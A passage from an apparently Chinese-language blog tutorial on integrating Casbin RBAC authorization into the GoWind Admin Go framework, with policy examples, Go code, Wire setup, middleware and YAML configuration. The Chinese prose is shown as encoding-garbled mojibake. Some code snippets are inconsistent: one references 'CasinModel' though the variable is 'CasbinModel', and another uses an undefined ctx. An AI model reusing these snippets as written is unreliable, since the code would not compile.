<li><code>regexMatch(r.act, p.act)</code>ï¼šæ”¯æŒæ­£åˆ™åŒ¹é…æ“ä½œï¼ˆå¦‚ <code>GET|POST</code> å¯åŒ¹é… <code>GET</code> æˆ– <code>POST</code> æ–¹æ³•ï¼‰ï¼›</li>
<li><code>keyMatch(r.dom, p.dom)</code>ï¼šåŸŸåŒ¹é…ï¼Œæ”¯æŒé€šé…ç¬¦ã€‚</li>
<li><strong>ç­–ç•¥æ•ˆæœï¼ˆPolicy Effectï¼‰</strong> å½“å­˜åœ¨å¤šæ¡ç­–ç•¥è§„åˆ™æ—¶ï¼Œå®šä¹‰æœ€ç»ˆçš„åˆ¤å®šé€»è¾‘ï¼Œæ”¯æŒå¤šç§é€»è¾‘è¡¨è¾¾å¼ï¼š<code>some(where (p.eft == allow))</code>ï¼šå­˜åœ¨ä»»æ„ä¸€æ¡å…è®¸è§„åˆ™å³é€šè¿‡ï¼ˆé»˜è®¤å¸¸ç”¨ï¼‰ï¼›</li>
<li><code>all(where (p.eft == allow))</code>ï¼šæ‰€æœ‰è§„åˆ™å‡ä¸ºå…è®¸æ‰é€šè¿‡ï¼›</li>
<li><code>some(where (p.eft == deny)) &amp;&amp; !some(where (p.eft == allow))</code>ï¼šå­˜åœ¨æ‹’ç»è§„åˆ™ä¸”æ— å…è®¸è§„åˆ™æ—¶æ‹’ç»ã€‚</li>
<li><strong>è§’è‰²å®šä¹‰ï¼ˆRole Definitionï¼‰</strong> RBAC æ¨¡å‹ä¸“ç”¨ï¼Œå®šä¹‰ç”¨æˆ·ä¸è§’è‰²çš„æ˜ å°„å…³ç³»ï¼Œæ ¼å¼ä¸º <code>g = _, _, _</code>ï¼šäºŒå…ƒç»„<code>ï¼ˆg = _, _ï¼‰</code>ï¼šé€‚ç”¨äºå•ç§Ÿæˆ·åœºæ™¯ï¼Œå¦‚ <code>g, alice, admin</code> è¡¨ç¤º <code>alice</code> æ˜¯ <code>admin</code> è§’è‰²ï¼›</li>
<li>ä¸‰å…ƒç»„ï¼ˆg = _, _, _ï¼‰ï¼šé€‚ç”¨äºå¤šç§Ÿæˆ·åœºæ™¯ï¼Œå¦‚ <code>g, alice, admin, tenant1</code> è¡¨ç¤º <code>alice</code> åœ¨ <code>tenant1</code> åŸŸä¸‹æ˜¯ <code>admin</code> è§’è‰²ã€‚</li>
</ol>
<h4 data-id="heading-8">3.2 ç­–ç•¥é…ç½®ï¼ˆPolicy Documentï¼‰</h4>
<p>ç­–ç•¥æ˜¯æ ¹æ®æ¨¡å‹å®šä¹‰ç”Ÿæˆçš„å…·ä½“æƒé™è§„åˆ™ï¼Œé‡‡ç”¨ CSV æ ¼å¼ï¼ˆæˆ–å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼‰ï¼Œæ¯æ¡è§„åˆ™å¯¹åº”ä¸€æ¡æƒé™åˆ†é…è®°å½•ã€‚è§„åˆ™å­—æ®µé¡ºåºéœ€ä¸æ¨¡å‹ä¸­ <code>policy_definition</code> çš„å®šä¹‰å®Œå…¨ä¸€è‡´ã€‚</p>
<h5 data-id="heading-9">3.2.1 åŸºç¡€ç¤ºä¾‹ï¼ˆRBAC æ¨¡å‹ï¼‰</h5>
<pre><code class="hljs language-csv" lang="csv"># æ ¼å¼ï¼šp, ä¸»ä½“ï¼ˆç”¨æˆ·/è§’è‰²ï¼‰, èµ„æº, æ“ä½œ, åŸŸï¼ˆå¯é€‰ï¼‰
# è§’è‰²æƒé™è§„åˆ™ï¼šadmin è§’è‰²å¯è®¿é—®æ‰€æœ‰èµ„æºï¼ˆé€šé…ç¬¦ *ï¼‰çš„æ‰€æœ‰æ“ä½œ
p, admin, *, *, *
# ç”¨æˆ·è§’è‰²æ˜ å°„ï¼šalice å±äº admin è§’è‰²ï¼ˆå¤šç§Ÿæˆ·åŸŸ tenant1ï¼‰
g, alice, admin, tenant1
# æ™®é€šç”¨æˆ·è§„åˆ™ï¼šbob å¯è®¿é—® /users æ¥å£çš„ GET æ–¹æ³•ï¼ˆåŸŸ tenant2ï¼‰
p, bob, /users, GET, tenant2
</code></pre>
<h5 data-id="heading-10">3.2.2 æ ¸å¿ƒè¯´æ˜</h5>
<ul>
<li>ç­–ç•¥ä¸»ä½“ï¼ˆsubï¼‰å¯æ˜¯ç”¨æˆ·æˆ–è§’è‰²ï¼šç›´æ¥ç»™ç”¨æˆ·åˆ†é…æƒé™ï¼ˆç›´è¿æˆæƒï¼‰æˆ–ç»™è§’è‰²åˆ†é…æƒé™ï¼ˆè§’è‰²æˆæƒï¼Œæ¨èï¼Œç¬¦åˆ RBAC æ€æƒ³ï¼‰ï¼›</li>
<li>èµ„æºï¼ˆobjï¼‰ä¸æ“ä½œï¼ˆactï¼‰æ”¯æŒé€šé…ç¬¦ <code>*</code>ï¼š<code>*</code> è¡¨ç¤ºä»»æ„èµ„æº/æ“ä½œï¼›</li>
<li>å¤šç§Ÿæˆ·åœºæ™¯å¿…é¡»æŒ‡å®šåŸŸï¼ˆdomï¼‰ï¼šé€šè¿‡åŸŸéš”ç¦»ä¸åŒç§Ÿæˆ·çš„æƒé™ï¼Œé¿å…æƒé™æ³„éœ²ï¼›</li>
<li>ç­–ç•¥æŒä¹…åŒ–ï¼šå®é™…é¡¹ç›®ä¸­ï¼Œç­–ç•¥è§„åˆ™ä¸ä¼šå­˜å‚¨åœ¨ CSV æ–‡ä»¶ä¸­ï¼Œè€Œæ˜¯æŒä¹…åŒ–åˆ° MySQLã€PostgreSQL ç­‰æ•°æ®åº“ï¼Œä¾¿äºåŠ¨æ€æ›´æ–°ä¸ç®¡ç†ã€‚</li>
</ul>
<h3 data-id="heading-11">å››ã€Casbin é›†æˆ GoWind Admin å®Œæ•´æ­¥éª¤</h3>
<p>GoWind Admin å·²å°† Casbin å°è£…è‡³ &lt;github.com/tx7do/kratos-authz&gt; ç»„ä»¶ä¸­ï¼Œå¼€å‘è€…æ— éœ€é‡å¤å®ç°æ ¸å¿ƒé€»è¾‘ï¼Œåªéœ€æŒ‰ä»¥ä¸‹æ­¥éª¤å®Œæˆé›†æˆä¸é…ç½®å³å¯ã€‚</p>
<h4 data-id="heading-12">4.1 æ ¸å¿ƒå°è£…ï¼šAuthorizer æƒé™ç®¡ç†å™¨</h4>
<p>é¦–å…ˆï¼Œåœ¨ <code>app/admin/service/internal/data/authorizer.go</code> ä¸­å®ç°æƒé™ç®¡ç†å™¨ï¼Œå°è£… Casbin å¼•æ“çš„åˆå§‹åŒ–ã€ç­–ç•¥é‡ç½®ç­‰æ ¸å¿ƒé€»è¾‘ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// app/admin/service/internal/data/authorizer.go</span>

<span class="hljs-keyword">package</span> data

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"context"</span>
	<span class="hljs-string">"errors"</span>

	<span class="hljs-string">"github.com/go-kratos/kratos/v2/log"</span>

	authzEngine <span class="hljs-string">"github.com/tx7do/kratos-authz/engine"</span>
	<span class="hljs-string">"github.com/tx7do/kratos-authz/engine/casbin"</span>
	<span class="hljs-string">"github.com/tx7do/kratos-authz/engine/noop"</span>

	pagination <span class="hljs-string">"github.com/tx7do/go-crud/api/gen/go/pagination/v1"</span>
	<span class="hljs-string">"github.com/tx7do/go-utils/trans"</span>
	conf <span class="hljs-string">"github.com/tx7do/kratos-bootstrap/api/gen/go/conf/v1"</span>

	<span class="hljs-string">"go-wind-admin/app/admin/service/cmd/server/assets"</span>

	adminV1 <span class="hljs-string">"go-wind-admin/api/gen/go/admin/service/v1"</span>
	userV1 <span class="hljs-string">"go-wind-admin/api/gen/go/user/service/v1"</span>
)

<span class="hljs-comment">// Authorizer æƒé™ç®¡ç†å™¨</span>
<span class="hljs-keyword">type</span> Authorizer <span class="hljs-keyword">struct</span> {
	log *log.Helper

	roleRepo        *RoleRepo
	apiResourceRepo *ApiResourceRepo

	engine authzEngine.Engine
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewAuthorizer</span><span class="hljs-params">(
	logger log.Logger,
	cfg *conf.Bootstrap,
	roleRepo *RoleRepo,
	apiResourceRepo *ApiResourceRepo,
)</span></span> *Authorizer {
	a := &amp;Authorizer{
		log:             log.NewHelper(log.With(logger, <span class="hljs-string">"module"</span>, <span class="hljs-string">"authorizer/repo/admin-service"</span>)),
		roleRepo:        roleRepo,
		apiResourceRepo: apiResourceRepo,
	}

	a.init(cfg)

	<span class="hljs-keyword">return</span> a
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a *Authorizer)</span></span> init(cfg *conf.Bootstrap) {
	a.engine = a.newEngine(cfg)

	<span class="hljs-keyword">if</span> err := a.ResetPolicies(context.Background()); err != <span class="hljs-literal">nil</span> {
		a.log.Errorf(<span class="hljs-string">"reset policies error: %v"</span>, err)
	}
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a *Authorizer)</span></span> newEngine(cfg *conf.Bootstrap) authzEngine.Engine {
	<span class="hljs-keyword">if</span> cfg.Authz == <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
	}

	ctx := context.Background()

	<span class="hljs-keyword">switch</span> cfg.GetAuthz().GetType() {
	<span class="hljs-keyword">default</span>:
		<span class="hljs-keyword">fallthrough</span>
	<span class="hljs-keyword">case</span> <span class="hljs-string">"noop"</span>:
		state, err := noop.NewEngine(ctx)
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
			a.log.Errorf(<span class="hljs-string">"new noop engine error: %v"</span>, err)
			<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
		}
		<span class="hljs-keyword">return</span> state

	<span class="hljs-keyword">case</span> <span class="hljs-string">"casbin"</span>:
		state, err := casbin.NewEngine(ctx)
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
			a.log.Errorf(<span class="hljs-string">"init casbin engine error: %v"</span>, err)
			<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
		}
		<span class="hljs-keyword">return</span> state
	}
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a *Authorizer)</span></span> Engine() authzEngine.Engine {
	<span class="hljs-keyword">return</span> a.engine
}

<span class="hljs-comment">// ResetPolicies é‡ç½®ç­–ç•¥</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a *Authorizer)</span></span> ResetPolicies(ctx context.Context) <span class="hljs-type">error</span> {
	<span class="hljs-comment">//a.log.Info("*******************reset policies")</span>

	roles, err := a.roleRepo.List(ctx, &amp;pagination.PagingRequest{NoPaging: trans.Ptr(<span class="hljs-literal">true</span>)})
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		a.log.Errorf(<span class="hljs-string">"failed to list roles: %v"</span>, err)
		<span class="hljs-keyword">return</span> err
	}

	<span class="hljs-keyword">if</span> roles == <span class="hljs-literal">nil</span> || <span class="hljs-built_in">len</span>(roles.Items) &lt; <span class="hljs-number">1</span> {
		a.log.Warnf(<span class="hljs-string">"no roles found to set policies"</span>)
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span> <span class="hljs-comment">// No roles to set policies</span>
	}

	apis, err := a.apiResourceRepo.List(ctx, &amp;pagination.PagingRequest{NoPaging: trans.Ptr(<span class="hljs-literal">true</span>)})
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		a.log.Errorf(<span class="hljs-string">"failed to list APIs: %v"</span>, err)
		<span class="hljs-keyword">return</span> err
	}

	<span class="hljs-keyword">if</span> apis == <span class="hljs-literal">nil</span> || <span class="hljs-built_in">len</span>(apis.Items) &lt; <span class="hljs-number">1</span> {
		a.log.Warnf(<span class="hljs-string">"no APIs found to set policies for roles"</span>)
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span> <span class="hljs-comment">// No APIs to set policies</span>
	}

	<span class="hljs-comment">//a.log.Debugf("roles [%d] apis [%d]", len(roles.Items), len(apis.Items))</span>

	<span class="hljs-keyword">var</span> policies authzEngine.PolicyMap

	<span class="hljs-keyword">switch</span> a.engine.Name() {
	<span class="hljs-keyword">case</span> <span class="hljs-string">"casbin"</span>:
		<span class="hljs-keyword">if</span> policies, err = a.generateCasbinPolicies(roles, apis); err != <span class="hljs-literal">nil</span> {
			a.log.Errorf(<span class="hljs-string">"generate casbin policies error: %v"</span>, err)
			<span class="hljs-keyword">return</span> err
		}

	<span class="hljs-keyword">case</span> <span class="hljs-string">"noop"</span>:
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>

	<span class="hljs-keyword">default</span>:
		a.log.Warnf(<span class="hljs-string">"unknown engine name: %s"</span>, a.engine.Name())
		<span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">"unknown authz engine name"</span>)
	}

	<span class="hljs-comment">//a.log.Debugf("***************** policy rules len: %v", len(rules))</span>

	<span class="hljs-keyword">if</span> err = a.engine.SetPolicies(context.Background(), policies, <span class="hljs-literal">nil</span>); err != <span class="hljs-literal">nil</span> {
		a.log.Errorf(<span class="hljs-string">"set policies error: %v"</span>, err)
		<span class="hljs-keyword">return</span> err
	}
	a.log.Infof(<span class="hljs-string">"Reloaded policy rules"</span>)

	<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
}

<span class="hljs-comment">// generateCasbinPolicies ç”Ÿæˆ Casbin ç­–ç•¥</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a *Authorizer)</span></span> generateCasbinPolicies(roles *userV1.ListRoleResponse, apis *adminV1.ListApiResourceResponse) (authzEngine.PolicyMap, <span class="hljs-type">error</span>) {
	<span class="hljs-keyword">var</span> rules []casbin.PolicyRule
	apiSet := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">uint32</span>]<span class="hljs-keyword">struct</span>{})

	domain := <span class="hljs-string">"*"</span>

	<span class="hljs-keyword">for</span> _, role := <span class="hljs-keyword">range</span> roles.Items {
		<span class="hljs-keyword">if</span> role.GetId() == <span class="hljs-number">0</span> {
			<span class="hljs-keyword">continue</span> <span class="hljs-comment">// Skip if role or API ID is not set</span>
		}

		<span class="hljs-keyword">for</span> _, apiId := <span class="hljs-keyword">range</span> role.GetApis() {
			apiSet[apiId] = <span class="hljs-keyword">struct</span>{}{}
		}

		<span class="hljs-keyword">for</span> _, api := <span class="hljs-keyword">range</span> apis.Items {
			<span class="hljs-keyword">if</span> api.GetId() == <span class="hljs-number">0</span> {
				<span class="hljs-keyword">continue</span> <span class="hljs-comment">// Skip if role or API ID is not set</span>
			}

			<span class="hljs-keyword">if</span> _, exists := apiSet[api.GetId()]; exists {
				rules = <span class="hljs-built_in">append</span>(rules, casbin.PolicyRule{
					PType: <span class="hljs-string">"p"</span>,
					V0:    role.GetCode(),
					V1:    api.GetPath(),
					V2:    api.GetMethod(),
					V3:    domain,
				})
			}
		}
	}

	policies := authzEngine.PolicyMap{
		<span class="hljs-string">"policies"</span>: rules,
		<span class="hljs-string">"projects"</span>: authzEngine.MakeProjects(),
	}

	<span class="hljs-keyword">return</span> policies, <span class="hljs-literal">nil</span>
}
</code></pre>
<h4 data-id="heading-13">4.2 ä¾èµ–æ³¨å…¥ï¼šæ³¨å†Œ Authorizer åˆ° Wire å®¹å™¨</h4>
<p>ä¿®æ”¹ <code>app/admin/service/internal/data/init.go</code>ï¼Œå°† <code>NewAuthorizer</code> æ³¨å†Œåˆ° Wire ä¾èµ–æ³¨å…¥å®¹å™¨ï¼Œç¡®ä¿æ¡†æ¶å¯åŠ¨æ—¶èƒ½è‡ªåŠ¨åˆå§‹åŒ–ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// app/admin/service/internal/data/init.go</span>
<span class="hljs-comment">//go:build wireinject</span>
<span class="hljs-comment">// +build wireinject</span>

<span class="hljs-keyword">package</span> data

<span class="hljs-keyword">import</span> <span class="hljs-string">"github.com/google/wire"</span>

<span class="hljs-comment">// ProviderSet æ•°æ®å±‚ä¾èµ–æ³¨å…¥é›†åˆï¼šæ³¨å†Œ Authorizer åŠå…¶ä»–æ•°æ®ä»“åº“</span>
<span class="hljs-keyword">var</span> ProviderSet = wire.NewSet(
    NewAuthorizer,        <span class="hljs-comment">// æ³¨å†Œæƒé™ç®¡ç†å™¨</span>
    NewRoleRepo,          <span class="hljs-comment">// æ³¨å†Œè§’è‰²æ•°æ®ä»“åº“</span>
    NewApiResourceRepo,   <span class="hljs-comment">// æ³¨å†Œ API èµ„æºæ•°æ®ä»“åº“</span>
    <span class="hljs-comment">// ... å…¶ä»–æ•°æ®ä»“åº“</span>
)
</code></pre>
<h4 data-id="heading-14">4.3 ä¸­é—´ä»¶é›†æˆï¼šå°†æƒé™æ ¡éªŒåµŒå…¥ REST æœåŠ¡</h4>
<p>ä¿®æ”¹ <code>app/admin/service/internal/server/rest.go</code>ï¼Œå°† Casbin æƒé™æ ¡éªŒä¸­é—´ä»¶åµŒå…¥ REST æœåŠ¡å™¨çš„è¯·æ±‚é“¾è·¯ä¸­ï¼Œå®ç°å¯¹æ‰€æœ‰æ¥å£çš„æƒé™æ‹¦æˆªï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// app/admin/service/internal/server/rest.go</span>

<span class="hljs-keyword">package</span> server

<span class="hljs-comment">// NewMiddleware åˆ›å»ºä¸­é—´ä»¶</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">newRestMiddleware</span><span class="hljs-params">(
	logger log.Logger,
	authenticator authnEngine.Authenticator,
	authorizer *data.Authorizer,
)</span></span> []middleware.Middleware {
	<span class="hljs-keyword">var</span> ms []middleware.Middleware
	ms = <span class="hljs-built_in">append</span>(ms, logging.Server(logger))

	ms = <span class="hljs-built_in">append</span>(ms, selector.Server(
		authn.Server(authenticator),
		auth.Server(),
		authz.Server(authorizer.Engine()),
	).Match(newRestWhiteListMatcher()).Build())

	<span class="hljs-keyword">return</span> ms
}

<span class="hljs-comment">// NewRESTServer new an HTTP server.</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewRESTServer</span><span class="hljs-params">(
    cfg *conf.Bootstrap, logger log.Logger,
	authenticator authnEngine.Authenticator, authorizer *data.Authorizer,
)</span></span> {
    ...

	srv := rpc.CreateRestServer(cfg,
		newRestMiddleware(logger, authenticator, authorizer)...,
	)

    ...
}
</code></pre>
<h4 data-id="heading-15">4.4 é…ç½®å¯ç”¨ï¼šä¿®æ”¹ auth.yaml å¯ç”¨ Casbin</h4>
<p>ä¿®æ”¹ <code>app/admin/service/configs/auth.yaml</code>ï¼Œå°†æƒé™å¼•æ“ç±»å‹è®¾ç½®ä¸º casbinï¼Œå¯ç”¨æƒé™æ ¡éªŒï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># app/admin/service/configs/auth.yaml</span>
<span class="hljs-comment"># æƒé™é…ç½®</span>
<span class="hljs-attr">authz:</span>
  <span class="hljs-attr">type:</span> <span class="hljs-string">"casbin"</span>  <span class="hljs-comment"># å¯é€‰å€¼ï¼šcasbinï¼ˆå¯ç”¨æƒé™æ ¡éªŒï¼‰ã€noopï¼ˆç¦ç”¨ï¼‰</span>
  <span class="hljs-comment"># casbin é¢å¤–é…ç½®ï¼ˆå¦‚æ•°æ®åº“è¿æ¥ã€ç¼“å­˜ç­‰ï¼Œæ ¹æ®å®é™…éœ€æ±‚æ·»åŠ ï¼‰</span>
  <span class="hljs-comment"># casbin:</span>
  <span class="hljs-comment">#   driver: "mysql"</span>
  <span class="hljs-comment">#   dsn: "user:password@tcp(127.0.0.1:3306)/casbin?parseTime=true"</span>
</code></pre>
<h4 data-id="heading-16">4.5 è‡ªå®šä¹‰æ¨¡å‹ï¼šå†…åµŒè‡ªå®šä¹‰ Casbin æ¨¡å‹</h4>
<p>è‹¥é»˜è®¤ RBAC æ¨¡å‹ä¸æ»¡è¶³ä¸šåŠ¡éœ€æ±‚ï¼Œå¯è‡ªå®šä¹‰æ¨¡å‹æ–‡ä»¶ï¼Œé€šè¿‡ assets å†…åµŒåˆ°é¡¹ç›®ä¸­ï¼š</p>
<h5 data-id="heading-17">1. åˆ›å»ºæ¨¡å‹æ–‡ä»¶</h5>
<p>åœ¨ <code>app/admin/service/cmd/server/assets/</code> ç›®å½•ä¸‹åˆ›å»º <code>casbin_model.conf</code>ï¼Œç¼–å†™è‡ªå®šä¹‰æ¨¡å‹è§„åˆ™ï¼ˆå‚è€ƒ 3.1 èŠ‚ï¼‰ï¼›</p>
<h5 data-id="heading-18">2. å†…åµŒæ¨¡å‹æ–‡ä»¶</h5>
<p>ä¿®æ”¹ <code>app/admin/service/cmd/server/assets/assets.go</code>ï¼Œé€šè¿‡ <code>//go:embed</code> æŒ‡ä»¤å°†æ¨¡å‹æ–‡ä»¶å†…åµŒåˆ°ç¨‹åºä¸­ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// app/admin/service/cmd/server/assets/assets.go</span>

<span class="hljs-keyword">package</span> assets

<span class="hljs-keyword">import</span> _ <span class="hljs-string">"embed"</span>

<span class="hljs-comment">//go:embed casbin_model.conf </span>
<span class="hljs-keyword">var</span> CasbinModel []<span class="hljs-type">byte</span> <span class="hljs-comment">// å†…åµŒè‡ªå®šä¹‰ Casbin æ¨¡å‹</span>
</code></pre>
<h5 data-id="heading-19">3. åŠ è½½è‡ªå®šä¹‰æ¨¡å‹</h5>
<p>åœ¨ <code>Authorizer.newEngine</code> æ–¹æ³•ä¸­ï¼Œé€šè¿‡<code>casbin.WithStringModel</code> åŠ è½½å†…åµŒçš„æ¨¡å‹:</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> data

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"go-wind-admin/app/admin/service/cmd/server/assets"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a *Authorizer)</span></span> newEngine(cfg *conf.Bootstrap) authzEngine.Engine {
	<span class="hljs-keyword">switch</span> cfg.GetAuthz().GetType() {
	<span class="hljs-keyword">default</span>:
		<span class="hljs-keyword">fallthrough</span>

	<span class="hljs-keyword">case</span> <span class="hljs-string">"casbin"</span>:
		state, err := casbin.NewEngine(ctx, casbin.WithStringModel(<span class="hljs-type">string</span>(assets.CasinModel)))
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
			a.log.Errorf(<span class="hljs-string">"init casbin engine error: %v"</span>, err)
			<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
		}
		<span class="hljs-keyword">return</span> state
	}
}
</code></pre>
<h3 data-id="heading-20">äº”ã€é›†æˆéªŒè¯ä¸å¸¸è§é—®é¢˜</h3>
<h4 data-id="heading-21">5.1 éªŒè¯é›†æˆæ•ˆæœ</h4>
<ol>
<li>å¯åŠ¨ GoWind Admin æœåŠ¡ï¼Œç¡®ä¿æ—¥å¿—ä¸­è¾“å‡º <code>success reload policy rules</code>ï¼Œè¯´æ˜ç­–ç•¥åŠ è½½æˆåŠŸï¼›</li>
<li>é€šè¿‡ Postman ç­‰å·¥å…·æµ‹è¯•æ¥å£ï¼šä½¿ç”¨ admin è§’è‰²ç”¨æˆ·è®¿é—®ä»»æ„æ¥å£ï¼šåº”èƒ½æ­£å¸¸è®¿é—®ï¼ˆç¬¦åˆ <code>p, admin, *, *, *</code> ç­–ç•¥ï¼‰ï¼›</li>
<li>ä½¿ç”¨æ™®é€šç”¨æˆ·è®¿é—®æ— æƒé™æ¥å£ï¼šåº”è¿”å› 403 Forbidden é”™è¯¯ï¼›</li>
<li>ä¿®æ”¹è§’è‰²æƒé™åï¼Œè°ƒç”¨ <code>Authorizer.ResetPolicies</code> é‡ç½®ç­–ç•¥ï¼ŒéªŒè¯æƒé™å˜æ›´æ˜¯å¦ç”Ÿæ•ˆã€‚</li>
</ol>
<h4 data-id="heading-22">5.2 å¸¸è§é—®é¢˜æ’æŸ¥</h4>
<ul>
<li><strong>ç­–ç•¥åŠ è½½å¤±è´¥</strong>ï¼šæ£€æŸ¥è§’è‰²/API èµ„æºæ˜¯å¦å­˜åœ¨ï¼Œæ•°æ®åº“è¿æ¥æ˜¯å¦æ­£å¸¸ï¼Œæ—¥å¿—ä¸­æ˜¯å¦æœ‰ <code>failed to list roles</code> ç­‰é”™è¯¯ï¼›</li>
<li><strong>æƒé™æ ¡éªŒä¸ç”Ÿæ•ˆ</strong>ï¼šæ£€æŸ¥ <code>auth.yaml</code> ä¸­ <code>authz.type</code> æ˜¯å¦è®¾ç½®ä¸º <code>casbin</code>ï¼Œæ˜¯å¦è¯¯å¯ç”¨ noop æ¨¡å¼ï¼›</li>
<li><strong>æ¥å£è·¯å¾„åŒ¹é…å¤±è´¥</strong>ï¼šæ£€æŸ¥æ¨¡å‹åŒ¹é…å™¨æ˜¯å¦ä½¿ç”¨ <code>keyMatch2</code> å‡½æ•°ï¼ˆæ”¯æŒè·¯å¾„å‚æ•°é€šé…ç¬¦ï¼‰ï¼Œé¿å…ä½¿ç”¨ç²¾ç¡®åŒ¹é…ï¼›</li>
<li><strong>å¤šç§Ÿæˆ·æƒé™éš”ç¦»å¤±æ•ˆ</strong>ï¼šæ£€æŸ¥ç­–ç•¥æ˜¯å¦åŒ…å«åŸŸï¼ˆdomï¼‰å­—æ®µï¼ŒåŒ¹é…å™¨æ˜¯å¦æ·»åŠ åŸŸåŒ¹é…é€»è¾‘ã€‚</li>
</ul>
<h3 data-id="heading-23">å…­ã€é¡¹ç›®ä»£ç ä¸å‚è€ƒèµ„æ–™</h3>
<h4 data-id="heading-24">6.1 é¡¹ç›®ä»£ç ä»“åº“</h4>
<ul>
<li>GoWind Admin Giteeï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Ftx7do%2Fgo-wind-admin" target="_blank" title="https://gitee.com/tx7do/go-wind-admin" ref="nofollow noopener noreferrer">gitee.com/tx7do/go-wiâ€¦</a></li>
<li>GoWind Admin Githubï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftx7do%2Fgo-wind-admin" target="_blank" title="https://github.com/tx7do/go-wind-admin" ref="nofollow noopener noreferrer">github.com/tx7do/go-wiâ€¦</a></li>
<li>Kratos-Authzï¼ˆCasbin å°è£…ç»„ä»¶ï¼‰ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftx7do%2Fkratos-authz" target="_blank" title="https://github.com/tx7do/kratos-authz" ref="nofollow noopener noreferrer">github.com/tx7do/kratoâ€¦</a></li>
</ul>
<h4 data-id="heading-25">6.2 æƒå¨å‚è€ƒèµ„æ–™</h4>
<ol>
<li>Casbin å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fcasbin.org%2Fzh%2Fdocs%2F" target="_blank" title="https://casbin.org/zh/docs/" ref="nofollow noopener noreferrer">casbin.org/zh/docs/</a></li>
<li>Casbin GitHub ä»“åº“ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcasbin%2Fcasbin" target="_blank" title="https://github.com/casbin/casbin" ref="nofollow noopener noreferrer">github.com/casbin/casbâ€¦</a></li>
<li>Casbin äº¤äº’å¼è§£é‡Šå™¨ï¼ˆåœ¨çº¿è°ƒè¯•ï¼‰ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fcasbin.org%2Fzh%2Feditor" target="_blank" title="https://casbin.org/zh/editor" ref="nofollow noopener noreferrer">casbin.org/zh/editor</a></li>
<li>Kratos å®˜æ–¹æ–‡æ¡£ï¼ˆä¸­é—´ä»¶é›†æˆï¼‰ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgo-kratos.dev%2Fdocs%2Fmiddleware%2Fintro" target="_blank" title="https://go-kratos.dev/docs/middleware/intro" ref="nofollow noopener noreferrer">go-kratos.dev/docs/middleâ€¦</a></li>
<li>RBAC æƒé™æ¨¡å‹è®¾è®¡æŒ‡å—ï¼š<a href="https://juejin.cn/post/7041059713848442917" target="_blank" title="https://juejin.cn/post/7041059713848442917">juejin.cn/post/704105â€¦</a></li>
<li>Casbin é›†æˆå®æˆ˜ï¼š<a href="https://juejin.cn/post/6947951229590831135" target="_blank" title="https://juejin.cn/post/6947951229590831135">juejin.cn/post/694795â€¦</a></li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ruoyié›†æˆdmnè§„åˆ™å¼•æ“]]></title>    <link>https://juejin.cn/post/7583878719543738377</link>    <guid>https://juejin.cn/post/7583878719543738377</guid>    <pubDate>2025-12-15T10:22:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583878719543738377" data-draft-id="7583871118949236786" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ruoyié›†æˆdmnè§„åˆ™å¼•æ“"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-15T10:22:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä»£ç æ¬¡ä½é¢"/> <meta itemprop="url" content="https://juejin.cn/user/1535333867720295"/></div> <div 